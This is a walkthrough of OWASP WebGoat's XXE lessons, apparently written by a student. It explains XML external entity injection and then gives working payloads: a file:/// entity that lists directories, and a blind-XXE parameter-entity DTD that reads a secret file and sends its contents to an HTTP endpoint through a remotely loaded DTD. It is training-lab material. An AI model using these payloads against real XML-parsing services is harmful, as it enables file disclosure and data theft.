# XXE
XXE = XML External Entity Attack

## What is an XXE injection?
- attack against an application that parses XML input
- occurs when XML input containing a reference to an external entity is  processed by a weakly configured XML parser.
- may lead to the disclosure of confidential data, DoS, server side request forgery, etc.
- Distinctions in different XXE attacks:
  - Classic: an external entity is included in a local DTD
  - Blind: no output and or errors are shown in the response
  - Error: try to get the content of a resource in the error message

## XML Entity
- XML Entity allows tags to be defined that will be replaced by content when the XML Document is parsed.
- Three types of entities:
  - Internal entities
  - External entities
  - Parameter entities
- An entity must be created in the Document Type Definition (DTD)

Example:
```
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

## List the Directory of the File System
Intercept comment submission with ZAP

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/10%20zap%20xxe%20request.PNG?token=ANjmpuYrSVcKPRGvRDvdV0UcGgpoCKuLks5bugWWwA%3D%3D)

Change comment section to:
```
<!DOCTYPE comment [
<!ELEMENT text (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///">
]>
<comment> <text>&xxe;</text></comment>
```

Results:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/11%20xxe%20files%20listed.PNG?token=ANjmpqFNvEDNxD_wEebCUjI8_uFITl8wks5bugvNwA%3D%3D)

## Modern REST Framework
Intercept comment submission with ZAP again

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/12%20xxe%20modern%20rest%20framework%20request.PNG?token=ANjmpibR-jC7UDO1c_elxkWTLYj0vjriks5bug5JwA%3D%3D)

Edit request:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/13%20modified%20request.PNG?token=ANjmppgBbtaqOBxHeZ4aL2A1AAIGUWmZks5bug6GwA%3D%3D)

Change Content-Type to:
```
Content-Type: application/xml
```

Change comment section to:
```
<!DOCTYPE comment [
<!ELEMENT text (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///">
]>
<comment> <text>&xxe;</text></comment>
```
## Blind XXE
Craft the file to be uploaded on WebWolf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///Users/Brenda/.webgoat-8.0.0.M21/XXE/secret.txt">
<!ENTITY % entity "<!ENTITY secret SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
%entity;
```

Intercept the request using burp:
![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/22%20XXE%203%20request.PNG?token=ANjmptLkxU5t8OcOP4uKMiZRraK1qAd7ks5bzJgDwA%3D%3D)

Change the content of the request to:
```
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://localhost:9090/files/tingle/test.dtd">
%remote;
]>
<comment>
  <text>WebGoat 8.0 rocks... (EphsjyUIBk)&send;</text>
</comment>
```

And lesson is completed.
